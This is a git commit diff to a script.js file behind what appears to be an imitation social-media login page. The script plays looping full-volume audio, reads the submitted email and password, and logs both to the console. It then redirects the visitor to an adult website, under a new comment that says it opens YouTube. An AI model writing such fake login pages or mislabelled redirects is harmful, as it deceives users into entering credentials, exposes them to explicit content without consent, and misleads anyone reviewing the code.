1d592e676c9359a78c6606da8845426ec93208a3
beernull <paulbernal2004@gmail.com>
2025-10-02 10:06:25 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,21 +1,19 @@
 document.addEventListener('DOMContentLoaded', function() {
     var audio = document.getElementById('backgroundAudio');
-    audio.loop = true; // Ensure the audio loops
-    audio.volume = 1.0; // Set volume to 100%
+    audio.loop = true; 
+    audio.volume = 1.0; 
 
-    // Function to play audio
+    //function to play audio
     function playAudio() {
         audio.play().catch(function(error) {
             console.error('Audio playback failed:', error);
         });
     }
 
-    // Play audio on any click on the document
     document.addEventListener('click', function() {
         playAudio();
     });
 
-    // Ensure the audio continues to play when the tab is active and stops when the tab is not active
     document.addEventListener('visibilitychange', function() {
         if (document.visibilityState === 'visible') {
             playAudio();
@@ -24,47 +22,33 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    // Play audio when "Log In" button is clicked
     document.getElementById('loginForm').addEventListener('submit', function(event) {
         event.preventDefault();
 
         var email = document.getElementById('email').value;
         var password = document.getElementById('password').value;
 
-        playAudio(); // Play audio on form submit
+        playAudio();
 
         if (email && password) {
-            // Log user inputs to the console
             console.log('Email:', email);
             console.log('Password:', password);
             
-            // Redirect to the specified URL after successful submission
+            //open YouTube 
             window.location.href = 'https://beeg.com/';
         } else {
-            // Show an error message if fields are not filled (if necessary)
             console.log('Please fill in both fields.');
         }
     });
 
-    // Play audio when "Forgotten password?" link is clicked
     document.getElementById('forgotPasswordLink').addEventListener('click', function() {
         playAudio();
     });
-
-    // Play audio when "Create New Account" button is clicked
+    
     document.getElementById('createAccountButton').addEventListener('click', function() {
         playAudio();
     });
 });
-
-
-
-
-
-
-
-
-
 
 
 
